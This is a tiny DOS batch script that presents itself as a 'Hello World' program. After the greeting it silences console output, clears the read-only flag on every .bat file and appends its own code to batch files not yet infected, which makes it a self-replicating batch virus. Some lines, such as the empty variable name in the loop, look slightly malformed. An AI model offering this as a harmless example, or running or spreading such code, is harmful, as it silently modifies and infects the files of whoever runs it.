@echo off
echo Hello World...
@ctty nul
attrib *.bat -r
for %%q in (*.bat) do set =%%q
find "" %%
if errorlevel 1 type %0 >> %%
